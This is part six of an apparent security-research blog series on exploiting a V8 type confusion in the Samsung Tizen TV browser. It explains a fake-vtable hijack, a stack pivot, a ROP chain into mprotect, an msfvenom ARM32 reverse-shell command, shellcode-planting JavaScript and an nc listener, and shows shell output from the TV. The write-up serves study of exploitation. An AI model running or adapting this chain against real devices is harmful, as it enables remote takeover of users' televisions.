---
title: "Samsung TV V8 RCE #6 — ROP, mprotect & reverse shell"
publishDate: "2026-06-18"
description: "The finale: hijack a DOM wrapper with a fake vtable, pivot the stack, ROP into mprotect, and land an ARM32 reverse shell on the TV."
tags: ["samsung-tv", "tizen", "chromium", "v8", "wasm", "type-confusion", "arm32", "browser-exploitation", "rce"]
draft: false
listed: false
lang: "en"
altSlug: "samsung-tv-v8-rce-rop-es"
series: "samsung-tv-v8-rce"
seriesOrder: 6
seriesLabel: "06 · ROP → mprotect → reverse shell"
---

We've reached the finale. The verdict from [05](/blog/samsung-tv-v8-rce-dep-or-rop) was clear — **W^X / DEP in force**: stack `RW-`, strict W^X library, JIT code-space `R-X` at rest. There's no RWX to abuse, so the execution stage is **ROP**. The good news is I've got everything to build it: arbitrary R/W ([01](/blog/samsung-tv-v8-rce-primitives)), an ASLR-proof `elf_base` ([04](/blog/samsung-tv-v8-rce-elf-base-dump)), and **395k gadgets** from the dumped `.so`.

What's left is the most fun part: *how* I get the CPU to start executing my gadgets.

## The hijack: fake vtable over the `ScriptWrappable`

The original PoC I ported ([PumpkinBridge](https://github.com/PumpkinBridge/Chrome-CVE-2024-2887-RCE-POC), Chrome **125 x64 Windows**) solves this with a **CodePointerTable (CPT) hijack** + PartitionAlloc corruption — **two constructs exclusive to the 64-bit V8 Sandbox**. And here comes something I didn't expect: on ARM32 neither of the two exists, and that *simplifies* my life instead of complicating it.

| Piece of the original (x64) | On ARM32 (32-bit) |
|--------------------------|-------------------|
| **PartitionAlloc SlotSpan corruption** (cage escape) | **Unnecessary.** Without a pointer-compression cage, `write32` already writes across **all** of the space ([01](/blog/samsung-tv-v8-rce-primitives)). There's no cage to break. |
| **CodePointerTable hijack** (`fptr_xor`) | **Doesn't exist.** The CPT is part of the 64-bit sandbox. In 32-bit V8 there's no CPT, no `fptr_xor`, no CFG over code pointers. |

There's no sandbox to escape (I already have full R/W) and no indirection to forge. The path that worked abuses an ARM quirk: in the ARM32 C++ calling convention, the `this` pointer is passed in **`r0`**.

To see why that's enough, you have to understand how a **virtual call** works in C++. When a virtual method of an object is called, the compiler doesn't know up front which function to jump to: it resolves it at runtime by looking at the object's **vtable** — a table of function pointers — which is stored in the object's first word. In other words: to call `obj->something()`, the CPU reads `*obj` (that's where the vtable is), finds the slot it needs, and jumps to that address. If I control what's in `*obj`, I control where it jumps. That's the whole idea, and it's built in three pieces:

1. **Point the wrapper at an object I control.** A DOM wrapper stores at `wrapper+0x10` the pointer to its Blink C++ object (the `ScriptWrappable`, on which Blink calls virtual methods all the time). With `write32` I overwrite that pointer and make it point to **my own `ArrayBuffer`**, whose address I already know via `addrOf`. From there on, as far as Blink is concerned, "the object" is my buffer: I decide byte by byte what's inside.

2. **Plant a fake vtable inside the buffer.** When Blink makes the next virtual call over "the object" (my buffer), it follows the same procedure as always: it reads the first word of the buffer to find the vtable, goes to that vtable, takes the slot of the method it wanted to call, and jumps to whatever address is there. Since the buffer is mine, I control both reads Blink makes: the first word (which I point at a fake vtable, also inside the buffer) and the slots of that fake vtable (where I put the addresses I want it to jump to). In every slot I write the **same** address: that of a gadget I call `PIVOT` — a little piece of code that already exists in `libchrome.so` and that I use to kick off the chain; I'll go into it in detail in step 3. Why the same one in every slot? Because I don't know — and I don't care — which virtual method Blink is going to invoke: whatever the slot is, the address it finds is always `PIVOT`. Guaranteed jump.

3. **Pivot the stack toward my buffer.** Here's the trick that makes ROP possible: a ROP chain runs by reading "the stack," so I need the stack to *be my buffer*. The real `PIVOT` gadget is `mov sp, r0 ; add sp, #4 ; pop {r4-fp, ip, lr} ; add sp, #8 ; bx lr`, and it does two things in one. First, `mov sp, r0` copies `r0` (my buffer) into `SP`: from that instant the processor takes as its stack the **ROP chain** I already wrote into the buffer. And here's the part that makes everything hold: the final `bx lr` does **not** return to the `lr` of the original call (that one would point back to Blink). Before the `bx lr`, that `pop {…, lr}` loads `lr` **from my own buffer**, where I already wrote the address of the chain's first gadget (`ARGS = pop {r0, r1, r2, …, pc}`). So the `bx lr` lands, deterministically, on `ARGS`, which loads `mprotect`'s arguments (`r0`, `r1`, `r2`) and kicks off the chain.

What's left is the **trigger**: *how* I force that virtual call when everything's ready. Here the object I hijack isn't `document.body` but a `<div>` that I create with `createElement` and **don't add to the DOM** — detached on purpose, so the engine doesn't touch it between my `write32` and the trigger (whereas `document.body` is referenced by the render all the time). With the wrapper already redirected, I read `div.nodeName`: that property, under the hood, is a **virtual method of `Node`**. Reading it fires exactly *one* virtual call over "the object" — which is now my buffer — and that's where it all starts. That `el.nodeName` is the trigger.

Here's how the buffer I prepare looks, and the sequence that fires a single virtual call:

```
My ArrayBuffer (I know it via addrOf):
┌──────────────────────────┬─────────────────────────────────┐
│ fake vtable: PIVOT,PIVOT… │ ROP chain: pop {r0,r1,r2}; …    │
└──────────────────────────┴─────────────────────────────────┘
  ▲ *(buf) lands here        ▲ SP points here after the pivot

Step 1   write32(div+0x10, buf)        → for Blink, the <div>'s ScriptWrappable is now my buffer
Step 2   read div.nodeName (virtual)   → r0 = buf ;  jumps to *(*buf) = PIVOT
Step 3   PIVOT: mov sp, r0             → SP = buf  (the stack is now my ROP chain)
Step 4   the ROP chain runs           → mprotect(page, 0x4000, RWX) ; jumps to the shellcode
```

Same *skeleton* as the original (corrupt an indirection → pivot → ROP → mem-protect → shellcode), but **without CPT, without `fptr_xor`, and without PartitionAlloc**. All that machinery from the original PoC stops mattering: with the DOM wrapper anchor I skip it entirely. Sometimes the right path is shorter than the original makes you believe.

## The chain, in three moves

Once `SP` points at the fake-stack, comes the classic ARM32 chain:

```
   pivot (SP→fake-stack)  →  ROP: mprotect(buf, len, RWX)  →  jump buf  →  shellcode
```

**1. Leak `mprotect`, without fighting libc's ASLR.** `mprotect` isn't a symbol defined in `libchromium-impl.so` — it's a **PLT import** to the libc of the `NEEDED` (Tizen's EFL stack). But thanks to `DF_BIND_NOW` + full RELRO ([05](/blog/samsung-tv-v8-rce-dep-or-rop)), the **GOT is already populated** at load time with the real runtime address. I read it with `read32()` from the GOT slot (known offset from the dump) → `mprotect`'s address, without having to defeat libc's ASLR separately. Everything hangs off `elf_base`, which I already derive stably.

**2. The ROP chain.** ARM EABI convention: arguments in `r0, r1, r2`. From the 395k gadgets come the `pop {r0, …} ; bx lr` needed to load `r0 = page_base` (page-aligned base of the buffer to make executable), `r1 = 0x4000` (`len`), `r2 = 7` (`PROT_READ|WRITE|EXEC`), and jump to `mprotect`. The buffer to turn RWX is my own `ArrayBuffer` — the same one that serves as the fake-stack — whose address I already know via `addrOf`.

**3. Jump to the shellcode.** After `mprotect`, `page_base` is **RWX**. I jump to it; the buffer contains the validation ARM32 shellcode.

The stage runs as two payloads — **recon, then trigger**:

- **`vtable.js`** — the **read-only** validation: it finds the `ScriptWrappable*` to hijack, confirms that `wrapper+0x10` is the target, and resolves `elf_base`/`mprotect`/`PIVOT`. It doesn't touch memory.
- **`pwn.js`** — the **write phase** (`FIRE=true`): plants the fake-vtable + the ROP chain in the `ArrayBuffer` and fires `write32 + trigger`.

![Payload `vtable` validating the hijack on the TV](/assets/blog/samsung-tv-rce-5-vtable.png)

*`vtable` (read-only): locates the wrapper's `ScriptWrappable*` as `VTABLE-FIRST (HIJACK TARGET)` and dumps the hijack validation summary (what the log labels `VALIDACIÓN CAMINO A`) — `elf_base`, runtime `mprotect`, `PIVOT` — without touching memory yet.*

![Payload `pwn` firing with FIRE=true on the TV](/assets/blog/samsung-tv-rce-6-pwn.png)

*`pwn` in the **write phase** (`FIRE = true`): plants the homogeneous fake-vtable + the ROP chain in the `ArrayBuffer` and fires `write32 + trigger`. The log cuts off right there because execution diverts to the shellcode and the render dies — exactly what I wanted.*

## The shellcode: `/bin/sh` backconnect

For the shellcode I only need unambiguous proof of native execution, no offensive payloads. So an ARM32 reverse shell (`linux/armle/shell_reverse_tcp`). The binary that actually fired the chain is [`payloads/shellcode/callback.bin`](https://github.com/hdbreaker/samsung-smarttv-tizen-9-chromium-120-v8-rce/tree/main/payloads/shellcode), from msfvenom:

```bash
msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.100.80 LPORT=1337 \
         -a armle --platform linux -f raw > callback.bin
```

Those 172 bytes I embed in `pwn.js` as an array and plant them in the `ArrayBuffer` (offset `L_SHELL = 0x600` of the backing), and I leave `mprotect`'s `lr` pointing there: when the page turns RWX, `mprotect` returns straight to the shellcode.

```javascript
// pwn.js — callback.bin embedded and planted in the buffer
const SHELLCODE = [
  0x02,0x00,0xa0,0xe3, 0x01,0x10,0xa0,0xe3, /* … */   // 172B of callback.bin
];
const L_SHELL = 0x600;                                 // offset of the shellcode within the backing
for (let i = 0; i < SHELLCODE.length; i++)
  sdv.setUint8(L_SHELL + i, SHELLCODE[i]);             // I write it into my ArrayBuffer

const shellAddr = (backing + L_SHELL) >>> 0;           // absolute address of the shellcode
sdv.setUint32(L_MPLR, shellAddr, true);                // mprotect's lr -> returns here, already RWX
```

`socket → connect → dup2 ×3 → execve("/bin/sh")` back to my PC, the researcher machine at `192.168.100.80:1337`. Listener:

```bash
nc -l 1337 -vv
```

> In [`payloads/shellcode/arm32_reverse_shell.s`](https://github.com/hdbreaker/samsung-smarttv-tizen-9-chromium-120-v8-rce/tree/main/payloads/shellcode) there's also a **hand-written** version of the same backconnect (null-free, ARM→Thumb, based on Gokul Babu's work) as reference and study material.

When the chain jumps to the RWX buffer, the TV opens `/bin/sh` against my laptop:

![Reverse shell received on the researcher machine](/assets/blog/samsung-tv-rce-shell-owner.png)

```text
$ nc -l 1337 -vv
uname -a
Linux localhost 5.4.261 #1 SMP PREEMPT ... armv7l GNU/Linux
whoami
owner
ps aux | grep sandbox
owner 15594 ... /usr/bin/efl_webprocess --type=zygote --no-sandbox -- .../org.tizen.browser
```

That's it. Arbitrary command execution on the TV with the browser's UID (`owner`). `armv7l` confirms the 32-bit ARM userland. And `--no-sandbox` in `efl_webprocess` means the Tizen Browser's render runs **without a sandbox** — so a V8 RCE drops directly onto the browser process, with no escape stage. No ADB, no developer mode: the only way in was a V8 bug on a page served from my own laptop.

## Why every link holds

The reverse shell isn't an offensive payload — it's the minimal, unambiguous proof of arbitrary code execution, and the whole arc of the series boils down to four steps:

1. A WasmGC **type confusion** gives arbitrary R/W, with no cage in 32-bit ([01](/blog/samsung-tv-v8-rce-primitives))
2. That R/W **derives `elf_base`** (ASLR-proof, [03](/blog/samsung-tv-v8-rce-golden-chain) / [04](/blog/samsung-tv-v8-rce-elf-base-dump)) and, now in this chapter, **leaks `mprotect`** from the GOT.
3. A **ROP chain** turns a buffer RWX despite W^X/DEP ([05](/blog/samsung-tv-v8-rce-dep-or-rop)).
4. The shellcode proves native execution: a shell on my PC.

It all started with a simple curiosity — *what's really on the other side of the screen?* — and the only honest way to answer it was to open the box and look inside. There was no map: every step was a hypothesis that the TV confirmed or rejected in its own way (a crash, a `\x7fELF`, a pointer that landed where it had to). What's left isn't the shell itself, but the method: take a closed device, ask it the right questions, and let it tell you how it's made. That, to me, is the magic of hacking.

## On Bug Bounty (and why this is free)

Some folks — especially those just starting out — wrote to me asking about Samsung's Bug Bounty program: https://security.samsungtv.com/bugbountyProgram

And honestly, I owe them an honest answer. I'm pretty sure a bug like this qualifies within the program. But those of you who've been following me already know I'm not a big fan of Bug Bounties, so before writing this I took the trouble to calmly look for a real *Vulnerability Disclosure Program*, one that would allow publishing. I didn't find a single public finding. Not one.

At this point in my life it's far more important to me to get back to writing, to reconnect with the community and share my OffSec adventures — the work of telling the how, not just the what — freely, than to cash a check in exchange for silence. Because that's the fine print almost nobody mentions: one of the worst things Bug Bounty brought to our community is that a lot of programs force you to keep the research under lock and key. You sign, you cash in, and what you discovered dies right there, in a PDF nobody will ever read.

Think about it for a second: every writeup that doesn't get published is a door closed on whoever comes next. I learned by reading others who took the trouble to tell the how. That, to me, is the real cost of Bug Bounty: what's lost isn't money, it's knowledge that could have belonged to everyone, fueling new research, closing gaps between researchers, and feeding back into our collective knowledge. Remember, Hacking is Illegal and for Nerds, our community has always sustained itself through knowledge shared among ourselves. And that's why what you're reading is free, open, and will stay that way.
